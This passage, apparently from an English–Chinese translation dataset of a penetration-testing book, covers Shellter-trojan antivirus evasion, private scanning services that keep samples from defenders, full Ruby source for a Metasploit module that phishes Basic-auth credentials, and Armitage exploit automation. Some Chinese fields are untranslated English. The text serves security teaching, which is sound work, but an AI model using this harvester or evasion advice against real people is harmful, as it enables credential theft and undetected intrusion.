  zh: 在用户听音乐时建立目标控制可能很有趣，但它也能展示Shellter的强大功能。例如，当我们将生成的文件与主要的杀毒软件进行比对时，我们发现成功躲避了67%的所有供应商。如你所见，Shellter以一种新颖的方式将shellcode整合到执行流程中，这使得它很难被检测到。
- en: Be Kind to the Community
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 对社区保持友善
- en: If you don’t have a lab already, you may be tempted to play around with your
    creations on one of the many sites offering virus scans or sandboxed VMs for live
    testing. If you’re going to do this, make sure you are working in an environment
    that won’t share your submissions with the antimalware community! You just might
    find that what worked for you on day 1 has suddenly stopped working and that you’ve
    locked yourself out by giving your target too much information. Consider purchasing
    an account with the sandbox vendor so that they can give you a private environment;
    similarly, instead of the popular VirusTotal, consider AntiScan.me or NoDistribute.com
    for scanning and studying the antivirus response to your creations.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你还没有实验室，你可能会想在许多提供病毒扫描或沙箱虚拟机进行实时测试的网站上玩弄你的创作。如果你打算这么做，确保你在一个不会将你的提交内容与反恶意软件社区分享的环境中工作！你可能会发现，第一天对你有效的东西突然不再有效，并且你可能通过提供过多的信息而将自己锁在外面。考虑购买沙箱供应商的账户，这样他们可以为你提供一个私人环境；同样，不要使用流行的VirusTotal，考虑使用AntiScan.me或NoDistribute.com进行扫描，并研究杀毒软件对你创作的响应。
- en: It’s important to keep in mind that this result is from a 10-minute demo that
    I put together for this book – there was no fine-tuning involved. Adapting your
    injected Trojan to a specific scenario within your client’s unique environment
    will be crucial. Perhaps your client uses one of the vendors who did *not* detect
    our demo as malicious – or maybe they use one of the other 33%, and you’ll have
    to get back to the drawing board. We’ll cover this kind of fine-tuning in [*Chapter
    10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187), *Shellcoding - The Stack*
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 重要的是要记住，这个结果是我为本书准备的10分钟演示的成果——没有进行细致的调整。根据你的客户独特环境中的具体场景调整你注入的木马将是至关重要的。也许你的客户使用了一个没有检测到我们演示为恶意的供应商——或者他们使用的是另外33%的供应商，你将不得不重新开始。我们将在[*第10章*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187)中介绍这种细致的调整，*Shellcoding
    - The Stack*。
- en: Modules – the bread and butter of Metasploit
  id: totrans-77
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 模块——Metasploit的核心
- en: We’ve already been playing around with modules within Metasploit. If it isn’t
    obvious by now, everything that is part of the Metasploit Framework is in its
    modules. Payloads are a kind of module; exploits are another kind of module that
    incorporates payloads. You can have exploit modules without payloads. They are
    known as auxiliary modules. To the uninitiated, it’s easy to think of the exploit
    modules as where the real excitement happens. Nothing feels quite so Hollywood
    as popping a shell after exploiting some obscure software flaw. But when you’re
    out in the field and find that almost all of that juicy pile of vulnerabilities
    isn’t present in client environments, you’ll find yourself relying on auxiliary
    modules instead.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经在 Metasploit 中玩过一些模块了。如果现在还不清楚的话，Metasploit 框架中的所有内容都是模块。有效载荷是一种模块；漏洞利用是另一种模块，它包括有效载荷。你可以拥有没有有效载荷的漏洞利用模块，它们被称为辅助模块。对于没有接触过的人来说，很容易认为漏洞利用模块才是充满激情的地方。在利用某个不为人知的软件漏洞成功打开一个
    Shell 后，那种感觉就像是好莱坞电影中的场景。但当你在实际环境中发现，几乎所有那些令人垂涎的漏洞都不存在于客户端环境中时，你会发现自己开始依赖辅助模块。
- en: Since we’ve already had a taste of how modules work, let’s look at the core
    of how they work by building one of our own. Although this is just a simple example,
    this will hopefully whet your appetite for more advanced module building later
    on.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 既然我们已经初步了解了模块的工作方式，那么让我们通过构建一个模块来深入了解它们的核心工作原理。尽管这只是一个简单的示例，但希望它能激起你对以后构建更高级模块的兴趣。
- en: Building a simple Metasploit auxiliary module
  id: totrans-80
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 构建一个简单的 Metasploit 辅助模块
- en: I don’t know about you, but I’m not the biggest fan of Ruby. Although Ruby can
    be awkward at times, module building in Metasploit makes up for it by making the
    process very easy. If you can put together some basic Ruby and understand how
    the different methods work, you can build a module.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 我不知道你怎么想，但我不是 Ruby 的大粉丝。虽然 Ruby 有时可能会让人感到不方便，但在 Metasploit 中构建模块的过程非常简单，弥补了这一点。如果你能编写一些基础的
    Ruby 并理解不同方法的工作原理，你就能构建一个模块。
- en: 'In this example, we’re throwing together a basic HTTP server that will prompt
    any visitor for credentials. It accomplishes this by kicking back a *401 Unauthorized*
    error to any request, which should prompt just about any browser to ask the user
    for credentials. Once the fake authentication is done, you can redirect the user
    to a URL of your choosing. Let’s look at this module chunk by chunk, starting
    with the following code:'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个示例中，我们搭建了一个基本的 HTTP 服务器，它会提示任何访问者输入凭据。它通过对任何请求返回*401 未授权*错误来实现这一点，这应该会让几乎所有浏览器都提示用户输入凭据。一旦假认证完成，您可以将用户重定向到您选择的
    URL。我们逐行分析这个模块，从以下代码开始：
- en: class MetasploitModule < Msf::Auxiliary
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: class MetasploitModule < Msf::Auxiliary
- en: include Msf::Exploit::Remote::HttpServer::HTML
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: include Msf::Exploit::Remote::HttpServer::HTML
- en: def initialize(info={})
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: def initialize(info={})
- en: super(update_info(info,
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: super(update_info(info,
- en: '''Name'' => ''HTTP Server: Basic Auth Credentials Capture'','
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: '''Name'' => ''HTTP 服务器：基本身份验证凭据捕获'','
- en: '''Description'' => %q{'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: '''Description'' => %q{'
- en: Prompt browser to request credentials via a 401 response.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 通过 401 响应提示浏览器请求凭据。
- en: '},'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: '},'
- en: ))
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: ))
- en: register_options([
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: register_options([
- en: OptString.new('REALM', [ true, "Authentication realm attribute to use.", "Secure
    Site" ]),
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: OptString.new('REALM', [ true, "用于身份验证的领域属性。", "安全站点" ]),
- en: OptString.new('redirURL', [ false, "Redirect destination after sending credentials."
    ])
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: OptString.new('redirURL', [ false, "发送凭据后重定向的目标地址。" ])
- en: '])'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: '])'
- en: end
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 结束
- en: As you can see, once we have created the **MetasploitModule** class, a module
    is being imported with **include**. Modules imported in this way are usually called
    **mixins** as they are grabbing all of the methods from the referenced module
    and mixing them in. This is important to note when you’re building a module or
    even studying a module to learn how it works. If you’re just looking at the inner
    workings of a module, you should check out the mixin code, too. Equally, if you’re
    building a module, don’t reinvent the wheel if you can include a module with core
    functionality. In our example, we’re capturing credentials while posing as an
    HTTP server, so we bring in the abilities of **Msf::Exploit::Remote::HttpServer::HTML**.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见，一旦我们创建了**MetasploitModule**类，就会使用**include**导入一个模块。通过这种方式导入的模块通常称为**mixins**，因为它们将引用模块中的所有方法并混合进来。当你在构建模块或者研究模块以了解其工作原理时，应该特别注意这一点。如果你只是查看一个模块的内部工作原理，也应该检查一下这个
    mixin 代码。同样，如果你在构建模块时，如果能够引入具有核心功能的模块，不要重复发明轮子。在我们的例子中，我们通过伪装成一个 HTTP 服务器来捕获凭据，因此我们引入了**Msf::Exploit::Remote::HttpServer::HTML**的功能。
- en: Here, the **initialize** method takes **info={}** as an argument and is meant
    to provide general information about the auxiliary module, with **super(update_info())**,
    and then declare the options available to the user with **register_options()**.
    We’re not concerned with the general information for now; however, we are interested
    in the options. Options are user-defined variables known as **datastore options**. **OptString.new()**
    declares a variable of the string class, so we’re now allowing the user to define
    the authentication realm, which redirects the URL after the falsified authentication
    is complete. You may be thinking, *what about localhost and port?*, and you’d
    be right to.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: Here, the **initialize** method takes **info={}** as an argument and is meant
    to provide general information about the auxiliary module, with **super(update_info())**,
    and then declare the options available to the user with **register_options()**.
    We’re not concerned with the general information for now; however, we are interested
    in the options. Options are user-defined variables known as **datastore options**. **OptString.new()**
    declares a variable of the string class, so we’re now allowing the user to define
    the authentication realm, which redirects the URL after the falsified authentication
    is complete. You may be thinking, *what about localhost and port?*, and you’d
    be right to.
- en: 'Remember that we imported the HTTP server mixin, which already has its port
    and host declared, as shown in the following code:'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 'Remember that we imported the HTTP server mixin, which already has its port
    and host declared, as shown in the following code:'
- en: def run
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: def run
- en: '@myhost = datastore[''SRVHOST'']'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: '@myhost = datastore[''SRVHOST'']'
- en: '@myport = datastore[''SRVPORT'']'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: '@myport = datastore[''SRVPORT'']'
- en: '@realm = datastore[''REALM'']'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: '@realm = datastore[''REALM'']'
- en: print_status("Listening for connections on
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: print_status("Listening for connections on
- en: '#{datastore[''SRVHOST'']}:#{datastore[''SRVPORT'']}...")'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: '#{datastore[''SRVHOST'']}:#{datastore[''SRVPORT'']}...")'
- en: Exploit
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: Exploit
- en: end
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: end
- en: Now, we have to create the **run** method, which is where the module’s functionality
    starts. Some instance variables are declared here using the values stored in the
    defined datastore options, and the user is then advised that we’re firing up a
    quick-and-dirty HTTP server.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: Now, we have to create the **run** method, which is where the module’s functionality
    starts. Some instance variables are declared here using the values stored in the
    defined datastore options, and the user is then advised that we’re firing up a
    quick-and-dirty HTTP server.
- en: 'Normally, the **run** method is where the juicy stuff goes, but in this case,
    we’re leveraging the HTTP server mixin. The real exploit that’s being called is
    just an HTTP server that returns requests and session data when someone connects
    to it. We also define the **on_request_uri()** method so that it does something
    with the returned data, as shown in the following code:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 'Normally, the **run** method is where the juicy stuff goes, but in this case,
    we’re leveraging the HTTP server mixin. The real exploit that’s being called is
    just an HTTP server that returns requests and session data when someone connects
    to it. We also define the **on_request_uri()** method so that it does something
    with the returned data, as shown in the following code:'
- en: def on_request_uri(cli, req)
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: def on_request_uri(cli, req)
- en: if(req['Authorization'] and req['Authorization'] =~ /basic/i)
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: if(req['Authorization'] and req['Authorization'] =~ /basic/i)
- en: basic,auth = req['Authorization'].split(/\s+/)
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: basic,auth = req['Authorization'].split(/\s+/)
- en: user,pass = Rex::Text.decode_base64(auth).split(':', 2)
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: user,pass = Rex::Text.decode_base64(auth).split(':', 2)
- en: print_good("#{cli.peerhost} - Login captured! \"#{user}:#{pass}\" ")
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: print_good("#{cli.peerhost} - Login captured! \"#{user}:#{pass}\" ")
- en: if datastore['redirURL']
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: if datastore['redirURL']
- en: 'print_status("Redirecting client #{cli.peerhost} to #{datastore[''redirURL'']}")'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 'print_status("Redirecting client #{cli.peerhost} to #{datastore[''redirURL'']}")'
- en: send_redirect(cli, datastore['redirURL'])
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: send_redirect(cli, datastore['redirURL'])
- en: else
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: else
- en: send_not_found(cli)
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: send_not_found(cli)
- en: end
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: end
- en: else
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: else
- en: 'print_status("We have a hit! Sending code 401 to client #{cli.peerhost} now...
    ")'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 'print_status("We have a hit! Sending code 401 to client #{cli.peerhost} now...
    ")'
- en: response = create_response(401, "Unauthorized")
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: response = create_response(401, "Unauthorized")
- en: response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
- en: cli.send_response(response)
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: cli.send_response(response)
- en: end
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: end
- en: end
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: end
- en: end
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: end
- en: Take a look at the general structure of the previous method. It’s essentially
    an **if...else** statement, which means that it is in reverse chronological order
    of events. This means we expect the initial request to come in, causing us to
    send back the 401 (the **else** statement) before we parse out the credentials
    that are sent back by the browser (the **if** statement). This is done because,
    from the perspective of the HTTP listener, anything that’s sent to the server
    is going to get passed to **on_request_uri()**.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: Take a look at the general structure of the previous method. It’s essentially
    an **if...else** statement, which means that it is in reverse chronological order
    of events. This means we expect the initial request to come in, causing us to
    send back the 401 (the **else** statement) before we parse out the credentials
    that are sent back by the browser (the **if** statement). This is done because,
    from the perspective of the HTTP listener, anything that’s sent to the server
    is going to get passed to **on_request_uri()**.
- en: The **if** statement will pass if the request contains an authentication attempt,
    parsing out and decoding the data from the inbound packet, and then displaying
    the captured credentials via **print_good()** (this means the process is a success).
    A nested **if** statement checks whether the user has defined the **redirURL**
    datastore option. If the check passes, an HTTP redirect is sent back; if it fails,
    a 404 is sent back. The **on_request_uri()** method is wrapped up with the **else**
    statement, which is executed if the inbound request is not an authentication attempt.
    An HTTP 401 response is created and sent, pulling the authentication realm from
    its respective datastore option.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: '**if**语句会在请求中包含身份验证尝试时通过，解析并解码来自入站数据包的数据，然后通过**print_good()**显示捕获的凭证（这意味着过程成功）。一个嵌套的**if**语句检查用户是否定义了**redirURL**数据存储选项。如果检查通过，则返回HTTP重定向；如果失败，则返回404。**on_request_uri()**方法被**else**语句包裹着，如果入站请求不是身份验证尝试，则会执行这个语句。一个HTTP
    401响应被创建并发送，拉取相应数据存储选项中的身份验证领域。'
- en: Now, it’s time to get our module into Metasploit. The folder where all the modules
    are located is called **/usr/share/metasploit-framework/modules**. Inside this
    folder, you’ll see sub-folders for the different module types. Our demo is an
    auxiliary module, and we’re hosting a server, so ultimately, the path is **/usr/share/metasploit-framework/modules/auxiliary/server**.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，是时候将我们的模块导入Metasploit了。所有模块所在的文件夹叫做**/usr/share/metasploit-framework/modules**。在这个文件夹中，你会看到不同模块类型的子文件夹。我们的示例是一个辅助模块，我们正在托管一个服务器，所以最终的路径是**/usr/share/metasploit-framework/modules/auxiliary/server**。
- en: Use **cp** or **mv** to get your module from your working folder to that specific
    location, and remember to note the filename of your module. Now, let’s fire up
    **msfconsole** as normal.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 使用**cp**或**mv**命令将你的模块从工作文件夹移动到特定位置，并记得记下模块的文件名。现在，像往常一样启动**msfconsole**。
- en: The Metasploit Framework will take several seconds to load because it’s checking
    all the modules to make sure they’re ready to rock, including yours. If you don’t
    see any syntax errors and Metasploit starts normally, congratulations – your new
    module made the cut!
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit框架加载需要几秒钟的时间，因为它正在检查所有模块，以确保它们都准备好，包括你的模块。如果没有看到任何语法错误并且Metasploit正常启动，恭喜你——你的新模块已经通过了！
- en: Metasploit – Making Life Easier
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit – 让生活更轻松
- en: Getting experience with this manual work is always useful for your understanding
    and development, but Metasploit does allow us to work in module development and
    customization on the fly with the **edit** and **reload** commands. You can edit
    the module within Metasploit, and then use **reload** to make it available in
    your current session.
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 获得这类手动操作的经验对于理解和发展始终是有帮助的，但Metasploit确实允许我们在模块开发和自定义方面进行实时操作，使用**edit**和**reload**命令。你可以在Metasploit中编辑模块，然后使用**reload**命令使其在当前会话中生效。
- en: 'When we issue **use** to load our module, we refer to it by name and by folder
    structure. In our example, the module is called **our_basic_HTTP.rb**, so we called
    it with **auxiliary/server/our_basic_HTTP**. After setting whatever options you
    need, type **exploit**, and you should see something similar to the following
    screenshot:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们使用**use**命令来加载我们的模块时，我们是通过名称和文件夹结构来引用它的。在我们的例子中，模块叫做**our_basic_HTTP.rb**，所以我们使用**auxiliary/server/our_basic_HTTP**来调用它。设置好你需要的选项后，输入**exploit**，你应该能看到类似下面的截图：
- en: '![Figure 7.5 – Running our module in the Metasploit console ](image/Figure_7.5_B17616.jpg)'
  id: totrans-137
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.5 – 在Metasploit控制台运行我们的模块](image/Figure_7.5_B17616.jpg)'
- en: Figure 7.5 – Running our module in the Metasploit console
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.5 – 在Metasploit控制台运行我们的模块
- en: 'Check out the flexibility that’s being offered here for today’s SSL world:
    you can negotiate SSL with a custom certificate, something that may come in handy
    when you’re impersonating appliances.'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 查看今天的SSL世界中所提供的灵活性：你可以使用自定义证书来协商SSL，这在你模拟设备时可能会派上用场。
- en: At this point, we’ve looked at Metasploit from down in the tactical gearbox.
    Now, let’s look at it from a higher, more strategic, perspective.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 此时，我们已经从战术层面看过了Metasploit。现在，让我们从更高的战略层面来看待它。
- en: Efficiency and attack organization with Armitage
  id: totrans-141
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Armitage的效率和攻击组织
- en: 'We shouldn’t consider this a true Metasploit discussion without touching on
    Armitage. Armitage is a graphical frontend environment for Metasploit with a couple
    of huge advantages:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 如果不提Armitage，我们不能算真正讨论Metasploit。Armitage是Metasploit的一个图形化前端环境，具有几个巨大的优势：
- en: Armitage allows for more efficient work. Many of the tedious aspects of working
    with a console are reduced, as many tasks can be automated by executing a series
    of actions with a single click. The user interface environment also makes organization
    a snap.
  id: totrans-143
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Armitage提高了工作效率。通过点击一次即可执行一系列动作，许多繁琐的控制台操作得到了简化，很多任务可以自动化完成。用户界面环境也让组织工作变得轻松。
- en: Armitage runs as a team server on a single machine, making it accessible from
    other Armitage clients on the network, which turns the Metasploit Framework into
    a fully fledged red-teaming attack platform. You can even script out your own
    Cortana-based red team bots. Even a single well-versed individual can become terrifying
    with Armitage as an interface to Metasploit.
  id: totrans-144
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Armitage作为团队服务器在单台机器上运行，使其可以从网络上的其他Armitage客户端进行访问，这将Metasploit框架转变为一个完整的红队攻击平台。你甚至可以编写自己的基于Cortana的红队机器人脚本。即使是一个熟练的个人，借助Armitage作为Metasploit的界面，也能变得极其可怕。
- en: We’ll explore Armitage again during post-exploitation, where its power shines.
    For now, let’s take a look at how we can make our Metasploit tasks more project-friendly.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将在后期利用Armitage进行后渗透测试，届时它的强大功能会得以展现。现在，让我们先来看看如何让我们的Metasploit任务更加项目化。
- en: Getting familiar with your Armitage environment
  id: totrans-146
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 熟悉你的Armitage环境
- en: Our first task is getting Armitage installed. Thankfully, it’s in the repository,
    so using **apt-get install armitage** is all you need. Once that’s done, run the
    **msfdb init** command to initialize the database. Finally, start it up with the
    **armitage** command.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的第一个任务是安装Armitage。幸运的是，它在软件库中，所以只需使用**apt-get install armitage**命令即可。安装完成后，运行**msfdb
    init**命令来初始化数据库。最后，使用**armitage**命令启动它。
- en: 'The first thing that happens is a logon prompt to an Armitage team server.
    The defaults are all you need for running locally, but this is where you’d punch
    in the details for a team server as part of a red team. Thankfully for us noobs,
    Armitage is pretty friendly and offers to start up the Metasploit RPC server for
    us if we haven’t already, as shown in the following screenshot:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 首先出现的是登录Armitage团队服务器的提示。默认设置足以满足本地运行的需求，但如果你是作为红队的一部分，这里是输入团队服务器详细信息的地方。幸运的是，Armitage对我们这些新手非常友好，如果我们还没有启动Metasploit
    RPC服务器，它会自动提供启动选项，如下图所示：
- en: '![Figure 7.6 – Armitage offering to start the RPC service ](image/Figure_7.6_B17616.jpg)'
  id: totrans-149
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.6 – Armitage 提供启动 RPC 服务的选项](image/Figure_7.6_B17616.jpg)'
- en: Figure 7.6 – Armitage offering to start the RPC service
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.6 – Armitage 提供启动 RPC 服务的选项
- en: Metasploit’s prompt may feel a little patronizing, but hey, we can’t take these
    things personally.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit的提示符可能让人觉得有点居高临下，但嘿，我们不能把这些事情看得太个人化。
- en: There are three main windows you’ll work in – **modules**, **targets**, and
    the **tabs** view. As you will see, there’s a full module tree in a friendly drop-down
    folder format, complete with a search bar at the bottom. The **targets** window
    is on the top right, and you’ll see it populate with targets as you get to work.
    At the bottom is **tabs**, where everything you’d normally see at the **msf**
    prompt takes place within tabs corresponding to individual jobs; you’ll also see
    information about things such as services enumerated on a target.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 你将会在三个主要窗口中工作——**模块**、**目标**和**标签**视图。正如你所看到的，模块树以友好的下拉文件夹格式呈现，底部还有一个搜索框。**目标**窗口位于右上角，当你开始工作时，目标会在此窗口中显示。底部是**标签**，你通常在**msf**提示符下看到的所有内容都在这里通过对应每个任务的标签呈现；你还可以看到诸如目标上列举的服务等信息。
- en: Remember, Armitage is nothing more than a frontend for Metasploit – everything
    it can do, Metasploit can do too. Armitage essentially does all of the typing,
    while providing you with professional-grade attack organization. Of course, you
    can always type down in the console window and do whatever you like, just as you
    would in Metasploit.
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 记住，Armitage不过是Metasploit的前端——它能做的，Metasploit也能做。Armitage本质上完成了所有的输入工作，同时为你提供专业级的攻击组织。当然，你始终可以在控制台窗口中输入任何命令，就像在Metasploit中一样。
- en: The drop-down menu bar at the top has a lot of power, including being your starting
    point for enumerating targets. Let’s take a look.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 顶部的下拉菜单栏功能强大，包括作为枚举目标的起始点。让我们来看看。
- en: Enumeration with Armitage
  id: totrans-155
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Armitage进行枚举
- en: 'Navigate to **Hosts** |** Nmap Scan **|** Quick Scan (OS detect)**. Enter the
    scan range, which we have entered here as **192.168.108.0/24**. Watch a new console
    tab called **nmap** pop up and then sit back and relax. You won’t see much happen
    until the scan reports that it’s finished, where the **targets** window will populate
    and the detected OS will be represented, as shown in the following screenshot:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 导航到**主机** | **Nmap 扫描** | **快速扫描（操作系统检测）**。输入扫描范围，我们在这里输入的是**192.168.108.0/24**。注意一个名为**nmap**的新控制台标签会弹出，然后你可以坐下来放松了。你不会看到太多变化，直到扫描报告完成，**目标**窗口会填充，并且检测到的操作系统会被显示，正如下面的截图所示：
- en: '![Figure 7.7 – Recon with Armitage ](image/Figure_7.7_B17616.jpg)'
  id: totrans-157
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.7 – 使用 Armitage 进行侦察](image/Figure_7.7_B17616.jpg)'
- en: Figure 7.7 – Recon with Armitage
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.7 – 使用 Armitage 进行侦察
- en: You can now conduct a more thorough scan for an individual target and review
    the results of the service’s enumeration. Do this by right-clicking on a host
    and selecting **Services**. A new tab will pop open with a table that’s essentially
    a nicer way of looking at a Nmap version’s scan output.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，你可以对单个目标进行更彻底的扫描，并查看服务枚举的结果。右键点击一个主机并选择**服务**，一个新标签会弹出，显示一个表格，这实际上是一个更美观的方式来查看
    Nmap 版本的扫描输出。
- en: Now, it’s time to talk about the elephant in the room – the graphical targets
    view. It’s pretty and all, and it makes for a nice Hollywood-hacker-movie demonstration
    for friends, but it isn’t practical in large and busy environments. Thankfully,
    you can navigate to **Armitage** | **Set Target View** and select **Table View** to
    change it.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，是时候谈谈桌面上的大象——图形化目标视图了。它看起来很漂亮，适合做一个好莱坞黑客电影演示给朋友们，但在大规模和忙碌的环境中并不实际。幸运的是，你可以导航到**Armitage**
    | **设置目标视图**并选择**表格视图**来进行更改。
- en: Exploitation made ridiculously simple with Armitage
  id: totrans-161
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 Armitage，漏洞利用变得异常简单
- en: Now comes the part where Armitage can save you a lot of time in the long run
    – understanding the attack surface and preparing potential attacks. Although you
    may be used to a more manual process, this time, we will select **Attacks** in
    the menu bar along the top and click on **Find Attacks**. You’ll see the progress
    bar for a brief period, and then a message wishing you well on your hunt. That’s
    it. So, what happened? Well, Armitage took the hosts and services enumeration
    data and automatically scanned the entire exploit module tree for matches. Right-click
    on a host and select **Attack**. For each service that’s detected with a match,
    there’s another dropdown naming the exploit that could potentially work. We say
    potentially as this is a very rough matching of service data and exploit options,
    and your homework isn’t done. You may enjoy clicking on random exploits to see
    what happens in your lab, but in the real world, you’re just making noise for
    no good reason.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来是 Armitage 可以为你节省大量时间的部分——理解攻击面并准备潜在的攻击。虽然你可能习惯了更手动的流程，但这次我们将在顶部菜单栏中选择**攻击**，然后点击**查找攻击**。你会看到进度条短暂出现，然后弹出一条祝你好运的消息。就这样。那么，发生了什么呢？嗯，Armitage
    获取了主机和服务的枚举数据，并自动扫描整个漏洞模块树以寻找匹配项。右键点击一个主机并选择**攻击**。对于每个检测到匹配的服务，会有另一个下拉菜单列出可能起作用的漏洞。我们说是可能的，因为这是一个非常粗略的服务数据和漏洞选项匹配，你的作业并没有完成。你可能喜欢点击随机漏洞看看在实验室里会发生什么，但在真实世界中，你只是白白制造噪音而已。
- en: 'One way to check for the applicability of an exploit is to use the appropriately
    named **check** command by performing the following steps:'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 检查利用是否适用的一种方法是使用恰如其名的**check**命令，按照以下步骤操作：
- en: In **msfconsole**, we can kick off this command from the prompt within a loaded
    module; in Armitage, we can accomplish the same feat by going to that same dropdown
    listing the exploits found, heading to the bottom of the list, and selecting exploits.
    Watch the **Tab** window come to life as each module is loaded automatically,
    and the **check** command is issued. Remember that an individual module has to
    support the **check** command, as not all do.
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**msfconsole**中，我们可以在加载的模块提示符下启动此命令；在 Armitage 中，我们可以通过前往同样的下拉菜单，列出已找到的漏洞，滚动到列表底部并选择漏洞，完成相同的操作。观察**Tab**窗口在每个模块自动加载时生动起来，**check**命令也会被执行。请记住，单个模块必须支持**check**命令，因为并非所有模块都支持。
- en: 'When you select an exploit from the list, the window that pops up is the same
    one you see when you load any exploit from the **Modules** window. The only difference
    is that the options are configured automatically to suit your target, as shown
    in the following screenshot:'
  id: totrans-165
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当你从列表中选择一个利用时，弹出的窗口与从 **Modules** 窗口加载任何利用时看到的窗口相同。唯一的区别是，选项会根据你的目标自动配置，如下图所示：
- en: '![Figure 7.8 – Browsing our procured attacks ](image/Figure_7.8_B17616.jpg)'
  id: totrans-166
  prefs: []
  type: TYPE_IMG
